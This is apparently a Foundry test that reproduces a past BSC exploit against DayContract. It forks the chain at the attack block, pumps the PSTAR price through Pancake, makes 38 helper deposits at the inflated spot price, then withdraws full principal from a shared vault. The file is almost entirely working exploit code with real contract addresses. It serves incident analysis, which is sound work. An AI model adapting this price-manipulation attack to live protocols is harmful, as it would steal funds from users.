// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$10.6K attacker profit; ~$29.7K protocol insolvency
// Attacker        : https://bscscan.com/address/0xf25d6a026c7853829e7cd5e98cd958a5a41be5e8
// Attack Contract : https://bscscan.com/address/0x0e59d33cc16b5d660725869c29bc26562c9975f1
// Vulnerable      : DayContract https://bscscan.com/address/0x587984549f7e61c0ed8131b1f6614f592573a43c
// Vault           : SettlementVault https://bscscan.com/address/0x66426a835c71c20ac222c8441117f78aa8f2ff12
// Attack Tx       : https://bscscan.com/tx/0xf3b8ceae88818d7121c84b7f00f7c99d1c6c45409ceb9de2eae10a92391755e7
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x587984549f7e61c0ed8131b1f6614f592573a43c#code
//
// @Analysis
// Twitter Guy : https://x.com/exvulsec/status/2038606487581495329
//
// Root cause:
//  1) deposit() mints LP against SPOT Pancake reserves (no TWAP / oracle).
//  2) withdraw() always settles full principal via vault.settlePrincipal(), which
//     drains SHARED vault LP via _ensureUSDTBalance — ignoring the post-manipulation
//     NAV of the order's own LP. Same-tx deposit→manip→withdraw is allowed.
//
// Attack (simplified, same economics as the live 38-helper flow):
//  flash/deal USDT → spike PSTAR price → batch deposit 1000 USDT orders at inflated
//  spot → dump PSTAR → withdraw all orders for full principal paid from shared LP.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDayContract {
    function deposit(uint256 amount) external;
    function withdraw(uint256 orderId) external;
    function getUserOrders(address user) external view returns (Order[] memory);
}

interface IReferral {
    function register(address referrer) external;
    function isRegistered(address) external view returns (bool);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

struct Order {
    uint256 orderId;
    uint256 principal;
    uint256 depositTime;
    uint256 claimedReward;
    uint256 lastClaimTime;
    uint256 dailyRateBps;
    bool isActive;
}

// Each helper is a separate registered depositor (mirrors live multi-helper design).
contract DayHelper {
    address immutable day;
    address immutable usdt;
    address immutable referral;
    address immutable sponsor;

    constructor(address day_, address usdt_, address referral_, address sponsor_) {
        day = day_;
        usdt = usdt_;
        referral = referral_;
        sponsor = sponsor_;
        IReferral(referral_).register(sponsor_);
    }

    function deposit(uint256 amount) external {
        IERC20(usdt).approve(day, amount);
        IDayContract(day).deposit(amount);
    }

    function withdraw(uint256 orderId) external {
        IDayContract(day).withdraw(orderId);
    }

    function sweep(address token, address to) external {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) IERC20(token).transfer(to, bal);
    }
}

contract DayContract_exp is BaseTestWithBalanceLog {
    address constant DAY = 0x587984549f7E61C0ED8131B1F6614F592573a43C;
    address constant VAULT = 0x66426a835c71C20AC222C8441117f78Aa8f2FF12;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant PSTAR = 0xa0d94224E5434471638b82985aF61B79109E09f5;
    address constant PAIR = 0x3F7b54e8b46B8a0780628A2361dcd9C3873fA9D9;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant REFERRAL = 0x50481E67dDc47c21Ab8d64f2350748b88646A615;
    // Already registered + hasDeposited — valid sponsor for new registrants.
    address constant SPONSOR = 0xB08dFCE61875d282B2dc022ff471c2Da5d1bbF58;

    uint256 constant ATTACK_BLOCK = 89_610_264;
    uint256 constant FORK_BLOCK = ATTACK_BLOCK - 1;

    uint256 constant DEPOSIT_EACH = 1_000 ether;
    uint256 constant NUM_HELPERS = 38;
    uint256 constant MANIP_USDT = 2_000_000 ether;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);
        fundingToken = USDT;
        vm.label(DAY, "DayContract");
        vm.label(VAULT, "SettlementVault");
        vm.label(PSTAR, "PSTAR");
        vm.label(PAIR, "PSTAR/USDT");
        vm.label(REFERRAL, "Referral");
    }

    function testExploit() public balanceLog {
        // Live attack flash-borrowed ~2.042M USDT from Moolah; abstract with deal.
        uint256 capital = MANIP_USDT + DEPOSIT_EACH * NUM_HELPERS + 50 ether;
        deal(USDT, address(this), capital);
        uint256 start = IERC20(USDT).balanceOf(address(this));

        // Register the main attacker under a live depositor so helpers can chain later if needed.
        IReferral(REFERRAL).register(SPONSOR);

        DayHelper[] memory helpers = new DayHelper[](NUM_HELPERS);
        for (uint256 i = 0; i < NUM_HELPERS; i++) {
            // Each helper registers under SPONSOR (already hasDeposited).
            helpers[i] = new DayHelper(DAY, USDT, REFERRAL, SPONSOR);
            require(IERC20(USDT).transfer(address(helpers[i]), DEPOSIT_EACH), "fund helper");
        }

        // Two fair-price deposits first (matches public write-up sequencing).
        helpers[0].deposit(DEPOSIT_EACH);
        helpers[1].deposit(DEPOSIT_EACH);

        // Spike PSTAR by buying with ~2M USDT.
        IERC20(USDT).approve(ROUTER, type(uint256).max);
        address[] memory buyPath = new address[](2);
        buyPath[0] = USDT;
        buyPath[1] = PSTAR;
        IRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MANIP_USDT, 0, buyPath, address(this), block.timestamp
        );
        uint256 pstarBal = IERC20(PSTAR).balanceOf(address(this));
        emit log_named_decimal_uint("PSTAR after manip buy", pstarBal, 18);

        // Remaining 36 deposits at inflated spot → tiny fair NAV after unwind.
        for (uint256 i = 2; i < NUM_HELPERS; i++) {
            helpers[i].deposit(DEPOSIT_EACH);
        }

        // Unwind manip: dump PSTAR back to USDT.
        IERC20(PSTAR).approve(ROUTER, type(uint256).max);
        address[] memory sellPath = new address[](2);
        sellPath[0] = PSTAR;
        sellPath[1] = USDT;
        IRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            pstarBal, 0, sellPath, address(this), block.timestamp
        );

        // Withdraw all orders — vault pays full principal by liquidating shared LP.
        for (uint256 i = 0; i < NUM_HELPERS; i++) {
            helpers[i].withdraw(0);
            helpers[i].sweep(USDT, address(this));
        }

        uint256 endBal = IERC20(USDT).balanceOf(address(this));
        emit log_named_decimal_uint("USDT start", start, 18);
        emit log_named_decimal_uint("USDT end", endBal, 18);
        if (endBal > start) {
            emit log_named_decimal_uint("Net USDT profit", endBal - start, 18);
        } else {
            emit log_named_decimal_uint("Net USDT loss", start - endBal, 18);
        }
        // Historical attacker profit ~10.6k; allow some slippage variance.
        require(endBal > start + 1_000 ether, "expected meaningful principal-guarantee profit");
    }
}
